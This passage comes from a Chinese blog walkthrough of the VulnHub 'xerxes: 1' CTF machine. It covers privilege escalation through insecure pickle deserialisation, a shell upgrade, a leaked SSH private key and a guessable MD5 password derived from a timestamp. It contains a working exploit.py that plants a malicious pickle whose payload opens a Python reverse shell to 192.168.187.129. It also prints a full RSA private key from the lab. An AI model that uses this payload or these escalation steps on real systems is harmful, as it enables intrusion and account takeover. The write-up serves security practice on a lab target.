exit&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;add&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="comment">#print &quot;add&quot;</span></span><br><span class="line">                                notes.append(<span class="string">&quot; - &quot;</span> + raw_cmd[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;save&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="comment">#print &quot;save&quot;</span></span><br><span class="line">                                save(raw_cmd[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;load&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="comment">#print &quot;load&quot;</span></span><br><span class="line">                                notes = load(raw_cmd[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;show&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="comment">#print &quot;show&quot;</span></span><br><span class="line">                                <span class="keyword">for</span> note <span class="keyword">in</span> notes:</span><br><span class="line">                                        <span class="built_in">print</span> note</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;quit&quot;</span> == cmd[<span class="number">0</span>] <span class="keyword">or</span> <span class="string">&quot;exit&quot;</span> == cmd[<span class="number">0</span>]:</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
+
+<p>在目标程序中，<code>load</code> 函数读取用户指定的文件，并用 <code>pickle.load</code> 解析其内容</p>
+<p>如果攻击者能够控制 <code>filename</code>，并在 <code>/home/curtiz/</code> 目录下放置一个精心构造的 pickle 文件，那么当程序执行 <code>load</code> 时，就会触发恶意代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(filename) &lt; <span class="number">1</span>:</span><br><span class="line">        filename = <span class="string">&quot;notes&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/home/curtiz/&quot;</span> + filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    notes = pickle.load(f)        <span class="comment"># 危险点：反序列化不受信任的数据</span></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> notes</span><br></pre></td></tr></table></figure>
+
+<p>在 Linux 权限模型中：</p>
+<ul>
+<li><p><strong>RUID (Real UID):</strong> 启动进程的真实用户 ID</p>
+</li>
+<li><p><strong>EUID (Effective UID):</strong> 进程执行时生效的用户 ID</p>
+</li>
+</ul>
+<p>尝试 Pickle 反序列化提权到 <code>curtiz</code> 用户上</p>
+<p>该文件中的对象 <code>__reduce__</code> 方法返回 <code>(os.system, (cmd,))</code>，即反序列化时会执行 <code>os.system(cmd)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cat exploit.py   </span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># pickle 模块序列化对象时，如果对象定义了 __reduce__ 方法，那么序列化时就会调用该方法，返回一个元组</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 在 Python 中，我们可以利用 os.setreuid 来同步 RUID 和 EUID</span></span><br><span class="line">        cmd = (</span><br><span class="line">			<span class="comment"># 建立一个反向 shell</span></span><br><span class="line">            <span class="string">&quot;python -c &#x27;import os,pty,socket;&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 导入 os、pty（伪终端）、socket 模块</span></span><br><span class="line">            <span class="string">&quot;os.setreuid(os.geteuid(), os.geteuid());&quot;</span> <span class="comment"># 关键一步：将 RUID 设为 EUID</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># os.geteuid() 获取当前进程的有效用户 ID（EUID），os.setreuid() 将真实用户 ID（RUID）和有效用户 ID（EUID）都设置为 EUI</span></span><br><span class="line">            <span class="string">&quot;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&quot;</span></span><br><span class="line">            <span class="string">&quot;s.connect((\&quot;192.168.187.129\&quot;,45640));&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 创建一个 TCP socket，并连接到攻击者监听的 IP 和端口</span></span><br><span class="line">            <span class="string">&quot;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># pty.spawn 会启动一个交互式 shell</span></span><br><span class="line">            <span class="string">&quot;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 这里返回了 (os.system, (cmd,))</span></span><br><span class="line">        <span class="comment"># os.system 会启动一个 shell 执行 cmd 字符串中的命令</span></span><br><span class="line">        <span class="comment"># 所以只要控制 cmd 的内容，就可以在反序列化的瞬间执行任意系统命令</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit(), protocol=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;evil_note&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/698c317217402bfe3bc80941.png"></p>
+<h3 id="Python-升级为交互式-Shell"><a href="#Python-升级为交互式-Shell" class="headerlink" title="Python 升级为交互式 Shell"></a>Python 升级为交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/698c34fc13218ae1b176c145.png"></p>
+<h3 id="SSH-私钥泄露"><a href="#SSH-私钥泄露" class="headerlink" title="SSH 私钥泄露"></a>SSH 私钥泄露</h3><p>进入到家目录中发现 <code>notes</code> 线索</p>
+<p><img src="https://pic1.imgdb.cn/item/698c357713218ae1b176c14a.png"></p>
+<p>翻译一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我找到了 Marie 的密钥文件，并且能够通过 SSH 登录</span><br></pre></td></tr></table></figure>
+
+<p>去找这个用户</p>
+<p><img src="https://pic1.imgdb.cn/item/698c365013218ae1b176c152.png"></p>
+<p>在当前用户家目录中发现还有一个 <code>id_rsa</code> 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAoRCJPJ0sIabJxmC0cbR1ppci3FFh5GBCVV/BYNnU9UKnOJyn</span><br><span class="line">CtKCZDd+RAZiNxrN37eh486uyBdbHu8UVcDaPDrge3XHrrHQn41za1I1eXYQ3dhV</span><br><span class="line">mSY8kLkqmXMYutTwPxB4Eav0KMbdmsg+frSEU1TDiIhEVG7/h5wQTpdWRMVRKDFb</span><br><span class="line">lrwm0yFV9a/Ib1+qB4AMUC9VFvAvqhMJfF2ZrYXcni1X+QRbGdr94seEYCg369lD</span><br><span class="line">XEcHhkAhf+LrU99bCsTXa5d6TMKhFrDegLd5Mb8VCAgZFUAStpYTbAfazwBN4eux</span><br><span class="line">9Q62opjNaNUN1XXpTD8hU4Q56YN0lNd/5rJRYQIDAQABAoIBABrcmSbEx8FtAaXW</span><br><span class="line">JwH3qM950VSRNhRSgX2flK7EZaHp1d25Mpq5dQmlv6c0sVijXcZ758IIjFnOm2HT</span><br><span class="line">Wb7bhQoaf6nXgM//091oR+GUOlrhd/qnw87g86TnXNVuvqcaMF80LfI0jWnnkLnp</span><br><span class="line">v5J+JLuJHXs9zreOM4u4WXfiAX9CbXrcwFoHEh7io0s1WmrA/DGJJLD50O6/GkN+</span><br><span class="line">QSvnU77JTb+1HOtXpN9T6x0tz/BEr3ahjYbzpqg+MPIuZUCU9uTK0Hfb+NPvd6sr</span><br><span class="line">bdjYGCKu6FPiYMgZ11WMGDWzI/Uiu8URtKmGe0e0x/Wlny6D/f21hlwO0XNOy2Pq</span><br><span class="line">ZeSj/WECgYEA0j6G6ah6onC6bcWOlnj7RRLV0Hv8TSdPoIA/ZUvAiZUsAqp9So+H</span><br><span class="line">Ne60/HZXIVFV+BkiZff86cYqvqRdg4UZ3pSAvxFhR97Xf3P84qe2cg1l3NPbhWkT</span><br><span class="line">Dp9XaP6sXFZ+eyKDTO9VkNbXRKIzZOzYqAmyqyZEqtRm5ZB1auBGvhUCgYEAxB4I</span><br><span class="line">Do6paaNDNT/Onmccm5wlbUr7kgSEweGI9QnEv2GK+kwPsTaagtU4B6zHxVVyXemk</span><br><span class="line">04r0ZtQo2GEWZkkrJiKQO7QYG3prNf9hd+4Jw8NDpdiUFeLr3q1YS3rpEDHN1EBV</span><br><span class="line">YebflltIf5Wkl27LJlT4Mz9BZbd3L0CVAWuO5R0CgYA/TPwp1cQ2rGI1MsofnAVr</span><br><span class="line">YqRlxS7NvAxJctOjmA88XWGG2/YlQNmg72ImsSrCqU6NCGRG90d6y2OLSsmtE6Ia</span><br><span class="line">VfP9kyoLDZkskquNQpm39Ti6KD9sB5rpSCh1QFh85L3oLRgDTfwhQ85Ep+F5faYt</span><br><span class="line">0d2tkjQSiyj/7WKs7yHdkQKBgQCpGe/+hVpkgObJelwxT11me6v14iqrDARgnJSY</span><br><span class="line">HLUuA/Buw7jgJ+Hwn+LxEzUp3PSBL5303aLBK3yQnp5O0hZHipPtNut2fgcFh0/G</span><br><span class="line">tlRrHOoujWGawZB57+PrKW7ejOMaeeJlSUpO/iS0BhbmkBzQz4E3xvoft6Mn9jrE</span><br><span class="line">/7Y1rQKBgAefUP+D3pt4EZa37RS6FdbTyHyFpYlzK8SVrnyt+ELn8MU4PJj72Yq4</span><br><span class="line">f2sTKGrC2DFXmNxhdJGAJw1vChET1aVU+QxJxckF/h4gJKsbfKuoSECb4Ojomh9o</span><br><span class="line">SeNEL6zyLP7mMLFvGnpc63pOTuDgQr954JMW4P2F5ekku2Ea5DMX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>使用私钥连接这个用户成功</p>
+<p><img src="https://pic1.imgdb.cn/item/698d80e41d67521e9b484749.png"></p>
+<h3 id="密码泄露"><a href="#密码泄露" class="headerlink" title="密码泄露"></a>密码泄露</h3><p>在家目录中找到两个可执行脚本</p>
+<p><img src="https://pic1.imgdb.cn/item/698d818ac46878ce9faee0cd.png"></p>
+<p>第一个脚本用于：</p>
+<ol>
+<li><p>检查一个名为 “last”（或包含 “last”）的文件</p>
+</li>
+<li><p>如果该文件超过 24 小时未更新，认为密码已过期</p>
+</li>
+<li><p>提示用户更新密码</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;XERXES checking security.&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取文件最后修改时间</span></span><br><span class="line">LAST=$(ls -alh | grep last | awk &#x27;&#123;print $6,$7,$8&#125;&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转换时间为时间戳</span></span><br><span class="line">LAST_SEC=$(date -d &quot;$LAST&quot; &quot;+%s&quot;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取当前时间戳</span></span><br><span class="line">DATE_SEC=$(date &quot;+%s&quot;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算时间差</span></span><br><span class="line">DIFF=$(expr $DATE_SEC - $LAST_SEC)</span><br><span class="line">if [ &quot;$DIFF&quot; -gt &quot;86400&quot; ]; then</span><br><span class="line">    echo &quot;Your password has expired. Please generate a new one.&quot;</span><br><span class="line">    echo &quot;XERXES wishes you&quot;</span><br><span class="line">    echo &quot;a nice day&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>第二个脚本用于：</p>
+<ol>
+<li><p><strong>创建密码标记</strong>：通过 <code>touch .last</code> 更新或创建时间戳文件</p>
+</li>
+<li><p><strong>生成随机密码</strong>：基于当前时间的 MD5 哈希值</p>
+</li>
+<li><p><strong>显示密码</strong>：输出格式化的密码信息</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建文件并生成密码</span></span><br><span class="line">touch .last &amp;&amp; p=$(date | awk &#x27;&#123;print $4&#125;&#x27; | md5sum | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line">echo &quot;XERXES has generated a new password: $p&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;XERXES is forever&quot;</span><br><span class="line">echo &quot;at your service&quot;</span><br></pre></td></tr></table></figure>
+
+<p>现在我们需要找到 “.last” 文件创建时间时间戳</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat .last</span><br></pre></td></tr></table></figure>
+
+<p>接下来需要获取其 MD5 哈希值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 00:19:51 |md5sum</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="https://pic1.imgdb.cn/item/698d8475c46878ce9faee1cb.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag" title="CTF">CTF</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag" title="提权">提权</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag" title="文件上传">文件上传</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Bot Challenges：Dexter" class="lazyload">
+        <a href="/2026/04/01/Bot%20Challenges%20Dexter/" aria-label="前一篇: VulnHub Bot Challenges：Dexter" title="前一篇: VulnHub Bot Challenges：Dexter"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub Bot Challenges：Dexter
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub /dev/random：relativity (v1.0.1)" class="lazyload">
+      <a href="/2026/04/01/dev-random%20relativity%20(v1.0.1)/" aria-label="后一篇: VulnHub /dev/random：relativity (v1.0.1)"  title="后一篇: VulnHub /dev/random：relativity (v1.0.1)"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub /dev/random：relativity (v1.0.1)
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xerxes-1"><span class="toc-number">1.</span> <span class="toc-text">xerxes: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RGBA-%E9%A2%9C%E8%89%B2%E8%A7%A3%E5%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">RGBA 颜色解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload"><span class="toc-number">1.2.1.</span> <span class="toc-text">Upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.3.1.</span> <span class="toc-text">权限配置不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.2.</span> <span class="toc-text">Pickle 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.4.</span> <span class="toc-text">SSH 私钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.5.</span> <span class="toc-text">密码泄露</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub xerxes：1",
+          url: "http://example.com/2026/04/01/xerxes%201/",
+          excerpt: "",
+          description: "",
+          stripContent: "xerxes: 1项目地址：https://download.vulnhub.com/xerxes/xerxes.tar.gz 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  80 端口  目录扫描到一个文件上传，但是没有密码  CTFRGBA 颜色解密点击忘记密码拿到一个二维码  在线网站扫描拿到一段字符串  Base64 解码得到 1look deeper  放大图片发现有色块  在 PS 等软件中查看颜色发现只有 ",
+          date: "Wed Apr 01 2026 16:16:00 GMT+0800",
+          updated: "Wed Apr 01 2026 17:05:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
